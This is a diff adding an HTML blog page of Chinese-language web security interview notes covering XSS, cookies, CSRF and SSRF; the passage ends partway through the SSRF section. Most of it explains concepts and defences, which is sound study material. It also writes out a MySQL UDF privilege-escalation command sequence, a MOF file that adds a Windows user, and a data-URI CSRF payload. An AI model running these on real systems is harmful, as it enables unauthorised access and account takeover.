@@ -1,0 +1,1316 @@
+<!DOCTYPE html><html lang="en"><head><style>:where(img){height:auto;width:auto}</style>
+    <meta charset="UTF-8">
+    <meta content="width=device-width" name="viewport">
+    <link href="/favicon.svg" rel="icon" type="image/svg+xml">
+    <link href="https://blog.sakanano.moe/posts/archive_web_security_interview/" rel="canonical">
+    <meta content="Astro v2.4.5" name="generator">
+
+    <!-- General Meta Tags -->
+    <title>web security interview</title>
+    <meta content="web security interview" name="title">
+    <meta content="Already Archive Before 20230604" name="description">
+    <meta content="lc4t" name="author">
+    <link href="/sitemap-index.xml" rel="sitemap">
+
+    <!-- Open Graph / Facebook -->
+    <meta content="web security interview" property="og:title">
+    <meta content="Already Archive Before 20230604" property="og:description">
+    <meta content="https://blog.sakanano.moe/posts/archive_web_security_interview/" property="og:url">
+    <meta content="https://blog.sakanano.moe/web%20security%20interview.png" property="og:image">
+
+    <!-- Twitter -->
+    <meta content="summary_large_image" property="twitter:card">
+    <meta content="https://blog.sakanano.moe/posts/archive_web_security_interview/" property="twitter:url">
+    <meta content="web security interview" property="twitter:title">
+    <meta content="Already Archive Before 20230604" property="twitter:description">
+    <meta content="https://blog.sakanano.moe/web%20security%20interview.png" property="twitter:image">
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com" rel="preconnect">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,600&amp;display=swap" rel="stylesheet">
+
+    
+
+    <script src="/toggle-theme.js"></script>
+  <link href="/_astro/404.03f57927.css" rel="stylesheet">
+<link href="/_astro/about.ace74c2a.css" rel="stylesheet">
+<link href="/_astro/about.6e6daff0.css" rel="stylesheet">
+<link href="/_astro/_slug_.40cf44c5.css" rel="stylesheet">
+<link href="/_astro/_slug_.41a32359.css" rel="stylesheet">
+<link href="/_astro/about.18333935.css" rel="stylesheet">
+<link href="/_astro/about.34388b73.css" rel="stylesheet">
+<link href="/_astro/_slug_.3b14054e.css" rel="stylesheet">
+<link href="/_astro/_slug_.906d67ca.css" rel="stylesheet"><script type="module">const e=document.querySelector(".hamburger-menu"),n=document.querySelector(".menu-icon"),u=document.querySelector("#menu-items");e?.addEventListener("click",()=>{let t="true"===e.getAttribute("aria-expanded");n?.classList.toggle("is-active"),e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"Open Menu":"Close Menu"),u?.classList.toggle("display-none")});</script></head>
+  <body>
+    
+  <header class="astro-3EF6KSR2">
+  <a href="#main-content" class="astro-3EF6KSR2" id="skip-to-content">Skip to content</a>
+  <div class="astro-3EF6KSR2 nav-container">
+    <div class="astro-3EF6KSR2 top-nav-wrap">
+      <a href="/" class="astro-3EF6KSR2 logo">
+        鱼の
+      </a>
+      <nav class="astro-3EF6KSR2" id="nav-menu">
+        <button class="astro-3EF6KSR2 focus-outline hamburger-menu" aria-label="Open Menu" aria-controls="menu-items" aria-expanded="false">
+          <svg class="astro-3EF6KSR2 menu-icon" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round" fill="none" height="24" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" width="24">
+            <line class="line astro-3EF6KSR2" x1="7" x2="21" y1="12" y2="12"></line>
+            <line class="line astro-3EF6KSR2" x1="3" x2="21" y1="6" y2="6"></line>
+            <line class="line astro-3EF6KSR2" x1="12" x2="21" y1="18" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="18" x2="6" y1="6" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="6" x2="18" y1="6" y2="18"></line>
+          </svg>
+        </button>
+        <ul class="astro-3EF6KSR2 display-none sm:flex" id="menu-items">
+          <li class="astro-3EF6KSR2">
+            <a href="/posts" class="astro-3EF6KSR2">
+              Posts
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/tags" class="astro-3EF6KSR2">
+              Tags
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/about" class="astro-3EF6KSR2">
+              About
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/search" class="astro-3EF6KSR2 focus-outline astro-5EUNQZKT group inline-block p-3 sm:p-1" tabindex="0" title="Search" aria-label="search">
+  
+              <svg class="astro-3EF6KSR2 scale-125 sm:scale-100" xmlns="http://www.w3.org/2000/svg"><path d="M19.023 16.977a35.13 35.13 0 0 1-1.367-1.384c-.372-.378-.596-.653-.596-.653l-2.8-1.337A6.962 6.962 0 0 0 16 9c0-3.859-3.14-7-7-7S2 5.141 2 9s3.14 7 7 7c1.763 0 3.37-.66 4.603-1.739l1.337 2.8s.275.224.653.596c.387.363.896.854 1.384 1.367l1.358 1.392.604.646 2.121-2.121-.646-.604c-.379-.372-.885-.866-1.391-1.36zM9 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5z" class="astro-3EF6KSR2"></path>
+              </svg>
+            
+</a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <button class="astro-3EF6KSR2 focus-outline" aria-label="auto" aria-live="polite" id="theme-btn" title="Toggles light &amp; dark">
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="moon-svg">
+                    <path d="M20.742 13.045a8.088 8.088 0 0 1-2.077.271c-2.135 0-4.14-.83-5.646-2.336a8.025 8.025 0 0 1-2.064-7.723A1 1 0 0 0 9.73 2.034a10.014 10.014 0 0 0-4.489 2.582c-3.898 3.898-3.898 10.243 0 14.143a9.937 9.937 0 0 0 7.072 2.93 9.93 9.93 0 0 0 7.07-2.929 10.007 10.007 0 0 0 2.583-4.491 1.001 1.001 0 0 0-1.224-1.224zm-2.772 4.301a7.947 7.947 0 0 1-5.656 2.343 7.953 7.953 0 0 1-5.658-2.344c-3.118-3.119-3.118-8.195 0-11.314a7.923 7.923 0 0 1 2.06-1.483 10.027 10.027 0 0 0 2.89 7.848 9.972 9.972 0 0 0 7.848 2.891 8.036 8.036 0 0 1-1.484 2.059z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="sun-svg">
+                    <path d="M6.993 12c0 2.761 2.246 5.007 5.007 5.007s5.007-2.246 5.007-5.007S14.761 6.993 12 6.993 6.993 9.239 6.993 12zM12 8.993c1.658 0 3.007 1.349 3.007 3.007S13.658 15.007 12 15.007 8.993 13.658 8.993 12 10.342 8.993 12 8.993zM10.998 19h2v3h-2zm0-17h2v3h-2zm-9 9h3v2h-3zm17 0h3v2h-3zM4.219 18.363l2.12-2.122 1.415 1.414-2.12 2.122zM16.24 6.344l2.122-2.122 1.414 1.414-2.122 2.122zM6.342 7.759 4.22 5.637l1.415-1.414 2.12 2.122zm13.434 10.605-1.414 1.414-2.122-2.122 1.414-1.414z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                </button>
+          </li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+  <div class="max-w-3xl mx-auto px-4">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+</header>
+  <div class="astro-VJ4TPSPI flex justify-start max-w-3xl mx-auto px-2 w-full">
+    <button class="astro-VJ4TPSPI flex focus-outline hover:opacity-75 mb-2 mt-8" onclick="history.back()">
+      <svg class="astro-VJ4TPSPI" xmlns="http://www.w3.org/2000/svg"><path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" class="astro-VJ4TPSPI"></path>
+      </svg><span class="astro-VJ4TPSPI">Go back</span>
+    </button>
+  </div>
+  <main class="astro-VJ4TPSPI" id="main-content">
+    <h1 class="astro-VJ4TPSPI post-title">web security interview</h1>
+    <div class="astro-VJ4TPSPI flex items-center my-2 opacity-80 space-x-2" data-hk="0-0"><svg class="inline-block fill-skin-base h-6 scale-100 w-6" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2z"></path><path d="M5 22h14c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2h-2V2h-2v2H9V2H7v2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2zM19 8l.001 12H5V8h14z"></path></svg><span class="sr-only">Posted on:</span><span class="italic text-base">2017年3月6日<span data-hk="0-1-0" aria-hidden="true"> | </span><span class="sr-only" data-hk="0-1-1">&nbsp;at&nbsp;</span>23:27</span></div>
+    <article class="astro-VJ4TPSPI max-w-3xl mx-auto mt-8 prose" id="article" role="article">
+      <h3 id="说明">说明</h3>
+<blockquote>
+<p>下面的题目都是遇到的原题或引申出的题目，答案不保证正确，欢迎有问题告诉我，或者补充</p>
+</blockquote>
+<!--more-->
+<h3 id="开放题目">开放题目</h3>
+<h4 id="对-web-安全的理解">对 Web 安全的理解</h4>
+<h4 id="熟悉的漏洞和防范手段">熟悉的漏洞和防范手段</h4>
+<h4 id="自己找到过的代码审计问题">自己找到过的代码审计问题</h4>
+<h4 id="平时用什么语言开发">平时用什么语言开发</h4>
+<h4 id="写过什么项目-什么功能-解决了什么难题">写过什么项目, 什么功能, 解决了什么难题</h4>
+<h4 id="用什么扫描器">用什么扫描器</h4>
+<h4 id="自我介绍">自我介绍</h4>
+<h4 id="学习了多久-web-安全-学了什么">学习了多久 web 安全 学了什么</h4>
+<h4 id="漏洞挖掘经验">漏洞挖掘经验</h4>
+<h4 id="漏洞深入研究经验">漏洞深入研究经验</h4>
+<h4 id="实习能来多久">实习能来多久</h4>
+<h4 id="实习的话想干什么">实习的话想干什么</h4>
+<h4 id="有什么没问到的方面">有什么没问到的方面</h4>
+<h4 id="实习做了什么就此方面提问">实习做了什么，就此方面提问</h4>
+<h4 id="讲讲-web-安全经历">讲讲 web 安全经历</h4>
+<h4 id="考研吗为什么">考研吗？为什么</h4>
+<!--more-->
+<h3 id="mysql-提权">MySQL 提权</h3>
+<h4 id="udf-提权目录位置">UDF 提权，目录位置</h4>
+<blockquote>
+<p>root
+func 表
+5.x</p>
+</blockquote>
+<ol>
+<li>show variables like ‘%plugin%‘;</li>
+<li>plugin_dir: /usr/bin/mysql/plugin (need rw)</li>
+<li>uname -a</li>
+<li>select hex(load_file(‘/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so’)) into outfile ‘/tmp/udf.txt’;</li>
+<li>select unhex(‘7F454C46020…’) into dumpfile ‘/usr/lib/mysql/plugin/mysqludf.so’;</li>
+<li>nm -D /usr/lib/mysql/plugin/mysqludf.so</li>
+<li>create function sys_eval returns string soname “mysqludf.so”;</li>
+<li>select sys_eval(‘whoami’);</li>
+</ol>
+<h4 id="mof-提权需要写目录上传权限">mof 提权，需要写目录上传权限</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">#pragma namespace("\\\\.\\root\\subscription")</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">instance of __EventFilter as $EventFilter</span></span>
+<span class="line"><span style="color:#abb2bf">{</span></span>
+<span class="line"><span style="color:#abb2bf">    EventNamespace = "Root\\Cimv2";</span></span>
+<span class="line"><span style="color:#abb2bf">    Name  = "filtP2";</span></span>
+<span class="line"><span style="color:#abb2bf">    Query = "Select * From __InstanceModificationEvent "</span></span>
+<span class="line"><span style="color:#abb2bf">            "Where TargetInstance Isa \"Win32_LocalTime\" "</span></span>
+<span class="line"><span style="color:#abb2bf">            "And TargetInstance.Second = 5";</span></span>
+<span class="line"><span style="color:#abb2bf">    QueryLanguage = "WQL";</span></span>
+<span class="line"><span style="color:#abb2bf">};</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">instance of ActiveScriptEventConsumer as $Consumer</span></span>
+<span class="line"><span style="color:#abb2bf">{</span></span>
+<span class="line"><span style="color:#abb2bf">    Name = "consPCSV2";</span></span>
+<span class="line"><span style="color:#abb2bf">    ScriptingEngine = "JScript";</span></span>
+<span class="line"><span style="color:#abb2bf">    ScriptText =</span></span>
+<span class="line"><span style="color:#abb2bf">    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user [username] [password] /add\")";</span></span>
+<span class="line"><span style="color:#abb2bf">};</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">instance of __FilterToConsumerBinding</span></span>
+<span class="line"><span style="color:#abb2bf">{</span></span>
+<span class="line"><span style="color:#abb2bf">    Consumer   = $Consumer;</span></span>
+<span class="line"><span style="color:#abb2bf">    Filter = $EventFilter;</span></span>
+<span class="line"><span style="color:#abb2bf">};</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#c678dd">select</span><span style="color:#abb2bf"> load_file(</span><span style="color:#98c379">'C:/wmpub/nullevt.mof'</span><span style="color:#abb2bf">) </span><span style="color:#c678dd">into</span><span style="color:#abb2bf"> dumpfile </span><span style="color:#98c379">'c:/windows/system32/wbem/mof/nullevt.mof'</span></span></code></pre>
+<hr>
+<h3 id="xss">XSS</h3>
+<h4 id="xss-一般问题">XSS 一般问题</h4>
+<blockquote>
+<p>反射型 XSS：依赖用户行为触发</p>
+</blockquote>
+<p>Hacker——发现存在反射 XSS 的 URL——根据输出点的环境构造 XSS 代码——进行编码、缩短(可有可无，是为了增加迷惑性)——发送给受害人——受害打开后，执行 XSS 代码——完成 hacker 想要的功能(获取 cookies、url、浏览器信息、IP 等等)</p>
+<blockquote>
+<p>存储型 XSS：自动触发</p>
+</blockquote>
+<p>储蓄型 XSS 其实和反射型 XSS 差不多，只是储蓄型把数据保存到服务端，而反射型只是让 XSS 游走在客户端上。下面是我在某处网站上检测到的储蓄 XSS</p>
+<blockquote>
+<p>DOMXSS：依赖用户行为，DOM 发生变化, 也有反射存储</p>
+</blockquote>
+<p>DOM XSS 是基于在 js 上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造 xss，因为服务端对我们是不可见的</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">4. flash XSS：</span></span></code></pre>
+<blockquote>
+<p>对抗 XSS</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. HTTP Only/ip绑定cookie</span></span>
+<span class="line"><span style="color:#abb2bf">2. 过滤输入(filter,服务端，htmkentities,htmlspecialchars,)和输出(转义、编码)</span></span>
+<span class="line"><span style="color:#abb2bf">3. 设置新的Cookie标志?</span></span>
+<span class="line"><span style="color:#abb2bf">4. 设置一个HTTP标头?</span></span>
+<span class="line"><span style="color:#abb2bf">5. (dom)输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode</span></span></code></pre>
+<blockquote>
+<p>技巧</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 字符编码绕过</span></span>
+<span class="line"><span style="color:#abb2bf">2. 注释符打通</span></span>
+<span class="line"><span style="color:#abb2bf">3. base标签</span></span>
+<span class="line"><span style="color:#abb2bf">4. 存储嵌套一个反射型</span></span></code></pre>
+<blockquote>
+<p>xss 位置</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. HTML标签中，如&lt;script&gt;&lt;a&gt;</span></span>
+<span class="line"><span style="color:#abb2bf">2. HTML属性中&lt;x src&gt;</span></span>
+<span class="line"><span style="color:#abb2bf">3. 在存在的&lt;script&gt;中拼接</span></span>
+<span class="line"><span style="color:#abb2bf">4. 事件中onclick,onerror</span></span>
+<span class="line"><span style="color:#abb2bf">5. CSS中，@import, url(), expression</span></span>
+<span class="line"><span style="color:#abb2bf">6. URL</span></span>
+<span class="line"><span style="color:#abb2bf">7. 输出点document.write, document.writeln, xxx.innerHTML, xxx.outerHTML, innerHTML.replace, document.attachEvent, window.attachEvent, document.location.replace, document.location.assign</span></span>
+<span class="line"><span style="color:#abb2bf">8. 输入点input,window.location(href,hash), window.name, document.referer, document.cookie, localstorage, XMLHttpRequest返回值</span></span></code></pre>
+<h4 id="xss-能用来干什么">XSS 能用来干什么</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 获取cookie</span></span>
+<span class="line"><span style="color:#abb2bf">2. GET/POST操作</span></span>
+<span class="line"><span style="color:#abb2bf">3. 钓鱼（伪造一个登录框）</span></span>
+<span class="line"><span style="color:#abb2bf">4. 获取浏览器（UA、插件）和系统信息（OS、控件）</span></span>
+<span class="line"><span style="color:#abb2bf">5. css history hack</span></span>
+<span class="line"><span style="color:#abb2bf">6. 结合其他环境（java）获取信息，例如ip</span></span>
+<span class="line"><span style="color:#abb2bf">7. WORM:感染+传播</span></span>
+<span class="line"><span style="color:#abb2bf">8. xss shell: 结合csrf</span></span>
+<span class="line"><span style="color:#abb2bf">9. xss: 攻击客户端(js爆破缓存目录、下载、执行木马)</span></span></code></pre>
+<h4 id="dom-xss-原理和防范">DOM XSS 原理和防范</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode</span></span></code></pre>
+<h4 id="如何保证-dom-不被修改防止-dom-xss">如何保证 DOM 不被修改，防止 DOM XSS</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. document.createTextNode</span></span>
+<span class="line"><span style="color:#abb2bf">2. 过滤输出数据</span></span>
+<span class="line"><span style="color:#abb2bf">3. 在脚本中将不可信数据插入到HTML前，先执行HTML转义、然后执行JS转义</span></span>
+<span class="line"><span style="color:#abb2bf">4. 在脚本中将不可信数据插入到HTML属性前，先执行JS转义</span></span>
+<span class="line"><span style="color:#abb2bf">5. 将不可信数据插入到事件处理句柄 和 JS 代码中，一定要小心（setTimeout, setInterval, new Function）</span></span>
+<span class="line"><span style="color:#abb2bf">6. 将不可信数据插入到CSS属性前先执行JS转义</span></span>
+<span class="line"><span style="color:#abb2bf">7. 将不可信数据插入到URL属性前，先执行URL转义，后执行JS转义</span></span></code></pre>
+<h4 id="存储型-xss-原理和防范">存储型 XSS 原理和防范</h4>
+<h4 id="xss-防御策略">XSS 防御策略</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 不可信的数据应该做为只显示的文本，不应该作为 JS代码或者标签被执行</span></span>
+<span class="line"><span style="color:#abb2bf">2. 对不可信数据总是采用JS转义，并添加引号的方法，让其出现在JS代码中</span></span>
+<span class="line"><span style="color:#abb2bf">3. 避免使用HTML渲染方法</span></span>
+<span class="line"><span style="color:#abb2bf">4. DOM中的URL转义需要注意字符集问题</span></span>
+<span class="line"><span style="color:#abb2bf">5. HTML渲染HTML转义，后执行JS转义</span></span>
+<span class="line"><span style="color:#abb2bf">6. eval() 不可信</span></span>
+<span class="line"><span style="color:#abb2bf">7. innerText比较安全</span></span></code></pre>
+<h4 id="如何快速发现可能-xss-的位置">如何快速发现可能 XSS 的位置</h4>
+<ol>
+<li>测试输入点的特殊字符过滤</li>
+<li>xssfuzz</li>
+<li>HTTP Referer</li>
+<li>User-Agent</li>
+<li>Cookie</li>
+<li>表单</li>
+<li>URL 参数</li>
+<li>URL 末尾</li>
+<li>跳转型 xss</li>
+</ol>
+<h4 id="xss-过滤放在输入还是输出好">XSS 过滤放在输入还是输出好</h4>
+<ol>
+<li>都要有，防止入库和防止生效</li>
+</ol>
+<h4 id="如何绕过-http-only">如何绕过 HTTP Only</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 利用中间件报错、Apache报错等</span></span></code></pre>
+<h4 id="xss-worm-原理">XSS worm 原理</h4>
+<ol>
+<li>Ajax</li>
+<li>攻击者发现目标网站存在 XSS 漏洞，并且可以编写 XSS 蠕虫。</li>
+<li>利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。</li>
+<li>当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。</li>
+</ol>
+<h4 id="xss-绕过同源策略获取子站另外网站的信息">XSS 绕过同源策略，获取子站、另外网站的信息</h4>
+<ol>
+<li>Java 同源策略绕过，同 IP</li>
+<li>XXE Injection</li>
+<li>Adobe Flash 同源策略绕过：allow-access-from</li>
+<li>Silverlight http=https</li>
+<li>document.domain(跨子域)</li>
+<li>JSONP</li>
+<li>CORS</li>
+<li>window.name 跨域</li>
+<li>window.postMessage 跨域传送</li>
+<li>crossdomain.xml</li>
+<li>location.hash</li>
+<li>WebSocket</li>
+</ol>
+<h3 id="cookie">Cookie</h3>
+<h4 id="cookie-有哪些参数secure-什么用">Cookie 有哪些参数，Secure 什么用</h4>
+<ol>
+<li>secure： 仅在 HTTPS 使用</li>
+<li>HTTP Only： 防止客户端(js)访问</li>
+<li>SameSite=Lax(仅 POST 禁止)/Strict(GET 也不允许跨域传送 Cookie)</li>
+</ol>
+<h3 id="csrf">CSRF</h3>
+<h4 id="原理">原理</h4>
+<p>参数可以被攻击者预测</p>
+<ol>
+<li>用户 C 打开浏览器，访问受信任网站 A，输入用户名和密码请求登录网站 A； 2.在用户信息通过验证后，网站 A 产生 Cookie 信息并返回给浏览器，此时用户登录网站 A 成功，可以正常发送请求到网站 A；</li>
+<li>用户未退出网站 A 之前，在同一浏览器中，打开一个 TAB 页访问网站 B；</li>
+<li>网站 B 接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点 A；</li>
+<li>浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。</li>
+</ol>
+<h4 id="csrf-如何不带-referer-访问绕过-referer">CSRF 如何不带 Referer 访问,绕过 Referer</h4>
+<ol>
+<li>跨协议时 referer 为空,例如 data://</li>
+</ol>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf"> &lt;</span><span style="color:#e06c75">iframe</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">src</span><span style="color:#abb2bf">=</span><span style="color:#98c379">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span><span style="color:#abb2bf">&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">base64为&lt;</span><span style="color:#e06c75">form</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">method</span><span style="color:#abb2bf">=</span><span style="color:#98c379">post</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">action</span><span style="color:#abb2bf">=</span><span style="color:#98c379">http://a.b.com/d</span><span style="color:#abb2bf">&gt;&lt;</span><span style="color:#e06c75">input</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">type</span><span style="color:#abb2bf">=</span><span style="color:#98c379">text</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">name</span><span style="color:#abb2bf">=</span><span style="color:#98c379">'id'</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">value</span><span style="color:#abb2bf">=</span><span style="color:#98c379">'123'</span><span style="color:#abb2bf">/&gt;&lt;/</span><span style="color:#e06c75">form</span><span style="color:#abb2bf">&gt;&lt;</span><span style="color:#e06c75">script</span><span style="color:#abb2bf">&gt;</span><span style="color:#e5c07b">document</span><span style="color:#abb2bf">.</span><span style="color:#e06c75">forms</span><span style="color:#abb2bf">[</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">].</span><span style="color:#61afef">submit</span><span style="color:#abb2bf">();&lt;/</span><span style="color:#e06c75">script</span><span style="color:#abb2bf">&gt;</span></span></code></pre>
+<h4 id="csrf-防御">CSRF 防御</h4>
+<p>(不完全解决)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">当用户关闭页面时，清除session；设置低时效session</span></span>
+<span class="line"><span style="color:#abb2bf">(不能解决打开标签页后再打开伪造请求页造成的csrf)</span></span></code></pre>
+<p>(不完全解决)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">检查referer是否是本站</span></span>
+<span class="line"><span style="color:#abb2bf">(不能解决跨协议空referer)</span></span></code></pre>
+<p>(不完全解决/简单)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">当表单提交时向form增加一个临时cookie字段</span></span>
+<span class="line"><span style="color:#abb2bf">(此cookie在前端生成，因此会被破解)</span></span></code></pre>
+<p>(仅防止表单提交)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">参考django的csrf_token，保证请求来源于本页</span></span>
+<span class="line"><span style="color:#abb2bf">(不能防止无表单获取/token)</span></span></code></pre>
+<p>(复杂)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">对每个敏感信息获取请求增加验证码</span></span></code></pre>
+<p>(防止 JSON HiJacking)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">在json数据头部加入while(1)</span></span></code></pre>
+<p>(HTTP-Headers)</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">在http头/协议层添加token验证</span></span></code></pre>
+<ol>
+<li>token 不能放在 url 中(被 referer 泄露);token 必须随机;token 一次性有效</li>
+<li>referer 不可能解决问题，因为必须保证空 referer 可以访问，否则无法直接访问主页，但是跨协议访问时会造成空 referer</li>
+<li>可以将安全认证和处理模块独立，做在外层</li>
+<li>可以结合多个解决方案</li>
+<li>在 1.4.3 中可以使用后端随机生成的 cookie 字段名</li>
+<li>在 1.4.6 中，浏览器可以去掉 json 文件违规的 while(1)，而对 hacker 可能会造成脚本卡死</li>
+<li>服务端配置缺少 Access-Control-Allow-Headers</li>
+</ol>
+<hr>
+<h3 id="ssrf">SSRF</h3>
+<h4 id="原理-1">原理</h4>
+<p>很多 web 应用都提供了从其他的服务器上获取数据的功能。使用用户指定的 URL，web 应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击</p>
+<p>如果应用程序对用户提供的 URL 和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷</p>
+<h4 id="挖掘">挖掘</h4>
+<blockquote>
+<p>从 WEB 功能上寻找</p>
+</blockquote>
+<ol>
+<li>分享：通过 URL 地址分享网页内容</li>
+<li>转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
+<li>在线翻译：通过 URL 地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</li>
+<li>图片加载与下载：通过 URL 地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的 api 实现以及其他调用 URL 的功能</li>
+</ol>
+<blockquote>
+<p>从 URL 关键字中寻找</p>
+</blockquote>
+<ol>
+<li>share/wap/url/link/src/source/target/u/3g/display/sourceURl/imageURL/domain</li>
+</ol>
+<blockquote>
+<p>SSRF 漏洞的验证</p>
+</blockquote>
+<ol>
+<li>基本判断（排除法）(URL 和看请求)</li>
+<li>实例验证</li>
+</ol>
